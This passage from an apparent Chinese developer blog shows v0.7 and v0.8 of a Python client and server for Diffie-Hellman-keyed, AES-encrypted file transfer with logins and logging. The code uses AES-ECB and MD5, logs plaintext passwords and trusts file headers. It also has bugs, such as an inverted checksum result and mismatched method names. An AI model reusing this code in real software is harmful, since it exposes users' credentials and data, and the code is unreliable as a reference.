s.send(transfer_data) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;)def slice_string(data, chunk_size): #根据指定大小切片字符串 return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]def transfer_file(s,shared_key): file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流 with open(file_addr,&#x27;rb&#x27;) as file: text = file.read() if len(text) &gt; 1000: sliced = 0 chunk_size = 1000 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\\n&quot;) begin_time = time.time() for i in range(len(sliced_data)): transfer_data = pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 s.send(transfer_data) text = (s.recv(1024)).decode() currect_time = time.time() temp = currect_time-begin_time print(&quot;\\r&quot;+text+f&quot; 当前运行了&#123;temp:.0f&#125;s&quot;,end=&quot;&quot;) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;) def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) public_key_server = key_switch(s,public_key_client) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_client.exchange(public_key_server) Authentication(s,shared_key) print(&quot;成功连接&quot;) while 1: print((s.recv(1024)).decode()) choice = input(choice_text) if choice == &quot;1&quot;: transfer_txt(s,shared_key) elif choice == &quot;2&quot;: transfer_file(s,shared_key) elif choice == &quot;3&quot;: register(s,shared_key) elif choice == &quot;4&quot;: print(&quot;程序终止&quot;) s.close() exit() else : print(&quot;未找到输入的选项，请重新输入&quot;) continueif __name__ == &quot;__main__&quot;: main() v0.7程序到这一版已经设计的比较完善了 可能还存在一些逻辑漏洞可以造成服务端宕机等问题 这个就留到后续的安全性分析吧 这一版本主要还是想优化一下文件传输的问题目前的问题在于 校验数据完整性没有进行处理 比如如果失败 应该记录下失败的数据组序号 然后返回给客户机然后就是识别文件类别的那块代码 现在用的是python-magic库来识别是属于什么文件 然后创建对应的文件用来存储接收到的数据不过不是很确定这个库他是不是只是对文件头进行识别 如果是的话感觉还是相当好伪造的 这里应该有一个比较大的安全隐患同时原本的类型处理也比较少 只适配了txt png mp3这三个最常见的格式 需要增加如果识别文件类型失败 就进行临时存储 同时报错客户端 import socketimport structimport hashlibimport timeimport refrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESchoice_text = &quot;&quot;&quot; 1.传输文本数据 2.传输文件数据 3.新增用户 4.断开连接输入选项:&quot;&quot;&quot;def md5_encrypt(data): #md5加密 用于完整性检测 md5_hash = hashlib.md5() md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef pack_data(choice,data,shared_key,sliced,sum): #将数据打包成报文 格式: sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes) sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum) sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced) choice_type = struct.pack(&#x27;&gt;I&#x27;,choice) en_data = encrypt_data(shared_key,data) if isinstance(data,str): data = data.encode() hash_data = md5_encrypt(data).encode() temp = choice_type+en_data+hash_data transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp return transfer_datadef key_switch(s,public_key_client): #交换公钥 print(&quot;等待连接服务端&quot;) s.connect((&quot;69.165.67.133&quot;,6666)) print(&quot;连接上服务端 开始进行公钥交换&quot;) public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) return serialization.load_pem_public_key(public_key_server)def encrypt_data(shared_key,data): #aes加密 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() data_bytes = pad(data, AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef Authentication(s,shared_key): print(&quot;开始进行身份验证&quot;) username = input(&quot;输入用户名:&quot;) encrypt_username = encrypt_data(shared_key,username) #用户名经过aes加密后传输 s.send(encrypt_username) text = s.recv(1024).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: print(text) exit() else: print(text) password = input(&quot;输入密码:&quot;) encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输 s.send(encrypt_password) text = s.recv(1024).decode() if text == &quot;密码错误，终止连接&quot;: print(text) exit() else : print(text) def register(s,shared_key): username = input(&quot;输入用户名 :&quot;) #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理 password = input(&quot;输入密码 :&quot;) data = username+&quot;;&quot;+password transfer_data = pack_data(3,data,shared_key,0,0) s.send(transfer_data)def transfer_txt(s,shared_key): text = input(&quot;输入数据 :&quot;) #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 s.send(transfer_data) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;)def slice_string(data, chunk_size): #根据指定大小切片字符串 return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]def transfer_file(s,shared_key): file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流 with open(file_addr,&#x27;rb&#x27;) as file: text = file.read() if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\\n&quot;) begin_time = time.time() failure_msg = &quot;第&quot; failure_number = None for i in range(len(sliced_data)): transfer_data = pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 s.send(transfer_data) text = (s.recv(1024)).decode() if &quot;失败&quot; in text: start_index = text.find(&#x27;&#123;&#x27;) + 1 end_index = text.find(&#x27;&#125;&#x27;) failure_number = text[start_index:end_index] failure_msg += failure_number+&quot;,&quot; currect_time = time.time() temp = currect_time-begin_time print(&quot;\\r&quot;+text+f&quot; 当前运行了&#123;temp:.0f&#125;s&quot;,end=&quot;&quot;) failure_msg += &quot;组传输失败&quot; if failure_number != None: print(failure_msg) print(&quot;\\n&quot;,end=&quot;&quot;) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;) def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) public_key_server = key_switch(s,public_key_client) print(&quot;公钥交换成功&quot;) print(&quot;开始计算共享密钥&quot;) shared_key = private_key_client.exchange(public_key_server) Authentication(s,shared_key) print(&quot;成功连接&quot;) while 1: print((s.recv(1024)).decode()) choice = input(choice_text) if choice == &quot;1&quot;: transfer_txt(s,shared_key) elif choice == &quot;2&quot;: transfer_file(s,shared_key) elif choice == &quot;3&quot;: register(s,shared_key) elif choice == &quot;4&quot;: print(&quot;程序终止&quot;) s.close() exit() else : print(&quot;未找到输入的选项，请重新输入&quot;) continueif __name__ == &quot;__main__&quot;: main() 服务端 import socketimport hashlibimport magicfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESimport sqlite3from concurrent.futures import ThreadPoolExecutorimport threadingmime = magic.Magic(mime=True)class query_thread(threading.Thread): def __init__(self,name = None): threading.Thread.__init__(self,name=name) def query_username(self,username): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,)) result = cursor.fetchone() cursor.close() return result def query_password(self,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password)) result = cursor.fetchone() cursor.close() return result def add_user(sock,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() try: # 插入新的用户数据 cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password)) conn.commit() sock.send(&quot;用户注册成功&quot;.encode()) except sqlite3.IntegrityError: sock.send(&quot;用户已存在&quot;.encode()) except Exception as e: sock.send(e.encode())def md5_encrypt(data): if isinstance(data, str): data = data.encode() # md5加密需要bytes参数 md5_hash = hashlib.md5() #md5加密 md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef key_switch(sock,public_key_server): print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;) try: public_key_client = sock.recv(1024) except Exception as e: print(&quot;接受错误&quot;,e) public_key_bytes = public_key_server.public_bytes( #将客户端的公钥序列化为 PEM 格式的字节串 encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象def decrypt_data(shared_key,data): #data要为byte型 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() decrypted_data = aes.decrypt(data) data = (unpad(decrypted_data, 16)).decode(&#x27;latin1&#x27;) return datadef unpack_data(sock,shared_key,orign_data): #拆解数据包 sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;) sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;) data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;) data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;) data_md5 = (orign_data[-32:]).decode() data = decrypt_data(shared_key,orign_data[12:(data_length-32)]) value = verify_md5(data,data_md5) if value == 0: sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode()) else : sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验失败&quot;).encode()) return sliced_sum,sliced_num,data_type,datadef Authentication(sock,shared_key,query_thread1): #身份验证部分 账号密码存储在users.db数据库中 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) username = (sock.recv(1024)) username = decrypt_data(shared_key,username) result = query_thread1.query_username(username) if result != None: sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode()) password = (sock.recv(1024)) decrypted_password = aes.decrypt(password) password = (unpad(decrypted_password, 16)).decode() result = query_thread1.query_password(username,password) if result != None: sock.send(&quot;身份验证通过&quot;.encode()) if username == &quot;admin&quot;: permission_value = 1 else : permission_value = 0 return permission_value else : sock.send(&quot;密码错误，终止连接&quot;.encode()) sock.close() return 3 else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) sock.close() return 3def menu(sock): text = &quot;开始进行数据传输&quot; sock.send(text.encode())def transfer_txt(addr,data): print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)def transfer_file(sock,data): #处理非切片数据 data_type = mime.from_buffer(data) filename = &quot;output/&quot;+threading.current_thread().name try: if data_type == &quot;text/plain&quot;: filename += &quot;.txt&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) else : print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) sock.send(text.encode()) def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key): #处理切片数据 data_bytes = data while sliced_num != sliced_sum-1: orign_data = (sock.recv(3000)) if len(orign_data) == 0: print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data) data_bytes += data data_bytes = data_bytes.encode(&#x27;latin1&#x27;) data_type = mime.from_buffer(data_bytes) filename = &quot;output/&quot;+threading.current_thread().name try: if data_type == &quot;image/png&quot;: filename += &quot;.png&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;audio/mpeg&quot;: filename += &quot;.mp3&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) else: print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) sock.send(text.encode()) def register(permission_value,sock,data,query_thread1): if permission_value == 0: #管理员权限的检验较为简单 sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode()) return else : parts = data.split(b&#x27;;&#x27;) username = parts[0] password = parts[1] query_thread1.adduser(sock,username,password) print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;)def verify_md5(data, original_md5): current_md5 = md5_encrypt(data) return current_md5 == original_md5def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1): print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;) public_key_client = key_switch(sock,public_key_server) print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;) print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;) permission_value = Authentication(sock,shared_key,query_thread1) print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;) if permission_value == 3: print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return while 1: menu(sock) orign_data = (sock.recv(3000)) if len(orign_data) == 0: print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) break sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data) if data_type == 1: transfer_txt(addr,data) elif data_type == 2: if sliced_sum != 0 or sliced_num != 0: transfer_file2(sock,data,sliced_sum,sliced_num,shared_key) else: transfer_file(sock,data) elif data_type ==3: register(permission_value,sock,data,query_thread1)def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 pool = ThreadPoolExecutor(max_workers=5) #定义一个线程池 拥有5个空闲线程 query_thread1 = query_thread() #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.bind((&quot;10.0.137.2&quot;,6666)) s.listen(5) #最多连接5个客户端 while 1: print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;) sock,addr = s.accept() client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1) if __name__ == &quot;__main__&quot;: main() v0.8这一版本的目的在于增加日志功能 因为就目前来说 一旦连接的客户机多了 服务端那边的输出就会比较混乱具体的实现应该也比较简单 在accpet连接后就创建一个文件以及字符串(作为记录该客户机操作记录的缓冲区)然后在检测客户机中断连接后就把缓冲区的内容写入日志 并且加入时间 来方便朔源或者直接在执行对应操作后就写入日志 不过从理论上来说应该是前者的方案更加节省资源预计难点在于在哪里塞入判断来check什么时候写入日志 所以还是选择后者吧同时还把原本写的和屎一样的传输数据类型转化优化了一下 变成了好闻的屎服务端 import socketimport hashlibimport magicimport timefrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESimport sqlite3from concurrent.futures import ThreadPoolExecutorimport threadingmime = magic.Magic(mime=True)def write_log(log_file,text): current_time = time.asctime(time.localtime(time.time())) text += &quot; &quot;+current_time log_file.write(text.encode()+b&quot;\\n&quot;)class query_thread(threading.Thread): def __init__(self,name = None): threading.Thread.__init__(self,name=name) def query_username(self,username): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,)) result = cursor.fetchone() cursor.close() return result def query_password(self,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password)) result = cursor.fetchone() cursor.close() return result def add_user(sock,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() try: # 插入新的用户数据 cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password)) conn.commit() sock.send(&quot;用户注册成功&quot;.encode()) except sqlite3.IntegrityError: sock.send(&quot;用户已存在&quot;.encode()) except Exception as e: sock.send(e.encode())def md5_encrypt(data): if isinstance(data, str): data = data.encode() # md5加密需要bytes参数 md5_hash = hashlib.md5() #md5加密 md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef key_switch(sock,public_key_server): print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;) try: public_key_client = sock.recv(1024) except Exception as e: print(&quot;接受错误&quot;,e) public_key_bytes = public_key_server.public_bytes( #将客户端的公钥序列化为 PEM 格式的字节串 encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象def decrypt_data(shared_key,data): #data要为byte型 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() decrypted_data = aes.decrypt(data) data = (unpad(decrypted_data, 16)) return datadef unpack_data(sock,shared_key,orign_data,log_file,addr): #拆解数据包 sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;) sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;) data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;) data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;) data_md5 = (orign_data[-32:]).decode() data = decrypt_data(shared_key,orign_data[12:(data_length-32)]) value = verify_md5(data,data_md5) if value == 0: sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验失败&quot;).encode()) text = f&quot;客户机&#123;addr&#125;传输数据过程中第&#123;sliced_num+1&#125;组数据校验失败&quot; write_log(log_file,text) else : sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode()) return sliced_sum,sliced_num,data_type,datadef Authentication(sock,shared_key,query_thread1,addr,log_file): #身份验证部分 账号密码存储在users.db数据库中 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) username = (sock.recv(1024)) if len(username) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return username = decrypt_data(shared_key,username) username = username.decode() result = query_thread1.query_username(username) if result != None: sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode()) password = (sock.recv(1024)) if len(password) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return password = decrypt_data(shared_key,password) password = password.decode() result = query_thread1.query_password(username,password) if result != None: sock.send(&quot;身份验证通过&quot;.encode()) if username == &quot;admin&quot;: permission_value = 1 else : permission_value = 0 text = f&quot;客户机&#123;addr&#125;使用用户名(&#123;username&#125;)密码(&#123;password&#125;)进行身份验证通过&quot; write_log(log_file,text) return permission_value,username else : sock.send(&quot;密码错误，终止连接&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;)输入密码(&#123;password&#125;),密码错误登录失败&quot; write_log(log_file,text) sock.close() return 3,username else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;),但是用户不存在&quot; write_log(log_file,text) sock.close() return 3,usernamedef menu(sock): text = &quot;开始进行数据传输&quot; sock.send(text.encode())def transfer_txt(addr,data,log_file): print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;) current_time = time.asctime(time.localtime(time.time())) text = f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125; &quot;+current_time write_log(log_file,text)def transfer_file(sock,data,addr,log_file): #处理非切片数据 data_type = mime.from_buffer(data) filename = &quot;output/&quot;+addr try: if data_type == &quot;text/plain&quot;: filename += &quot;.txt&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) else : print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot; write_log(log_file,text) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot; write_log(log_file,text) sock.send(text.encode()) def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key,addr,log_file): #处理切片数据 data_bytes = data while sliced_num != (sliced_sum-1): orign_data = (sock.recv(3000)) if len(orign_data) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) sock.close() return sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data,log_file,addr) data_bytes += data data_type = mime.from_buffer(data_bytes) filename = &quot;output/&quot;+addr try: if data_type == &quot;image/png&quot;: filename += &quot;.png&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;audio/mpeg&quot;: filename += &quot;.mp3&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) else: print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot; write_log(log_file,text) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot; write_log(log_file,text) sock.send(text.encode()) def register(permission_value,sock,data,query_thread1,log_file,addr,login_username): if permission_value == 0: #管理员权限的检验较为简单 sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试使用非管理员权限用户(&#123;login_username&#125;)注册新用户&quot; write_log(log_file,text) return else : parts = data.split(b&#x27;;&#x27;) username = parts[0] password = parts[1] query_thread1.adduser(sock,username,password) print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;) text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)成功 对应用户密码为(&#123;password&#125;)&quot;def verify_md5(data, original_md5): current_md5 = md5_encrypt(data) return current_md5 == original_md5def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1): addr = format(addr[0]) log_name = &quot;logfile/&quot;+addr+&quot;-log&quot; try: log_file = open(log_name,&#x27;ab+&#x27;) except Exception as e: print(f&quot;&#123;threading.current_thread().name&#125;创建日志文件失败,错误信息:&#123;e&#125;&quot;) text = f&quot;客户机&#123;addr&#125;连接成功&quot; write_log(log_file,text) print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;) public_key_client = key_switch(sock,public_key_server) print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;) print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;) permission_value,username = Authentication(sock,shared_key,query_thread1,addr,log_file) if permission_value == 3: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;) while 1: menu(sock) orign_data = (sock.recv(3000)) if len(orign_data) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) break sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data,log_file,addr) if data_type == 1: text = f&quot;客户机&#123;addr&#125;执行了传输文本数据操作&quot; write_log(log_file,text) transfer_txt(addr,data,log_file) elif data_type == 2: if sliced_sum != 0 or sliced_num != 0: text = f&quot;客户机&#123;addr&#125;执行了传输文件操作,并且传输的文件过大需要切片传输,切片总数为&#123;sliced_sum&#125;&quot; write_log(log_file,text) transfer_file2(sock,data,sliced_sum,sliced_num,shared_key,addr,log_file) else: text = f&quot;客户机&#123;addr&#125;执行了传输文件操作&quot; write_log(log_file,text) transfer_file(sock,data,addr,log_file) elif data_type ==3: text = f&quot;客户机&#123;addr&#125;执行了注册账号操作&quot; write_log(log_file,text) register(permission_value,sock,data,query_thread1,log_file,addr,username)def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 pool = ThreadPoolExecutor(max_workers=5) #定义一个线程池 拥有5个空闲线程 query_thread1 = query_thread() #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #允许在端口上处于 TIME_WAIT 状态时再次绑定 s.bind((&quot;10.0.137.2&quot;,6666)) s.listen(5) #最多连接5个客户端 while 1: print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;) sock,addr = s.accept() client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1) if __name__ == &quot;__main__&quot;: main() 客户端 import socketimport structimport hashlibimport timeimport refrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESchoice_text = &quot;&quot;&quot; 1.传输文本数据 2.传输文件数据 3.新增用户 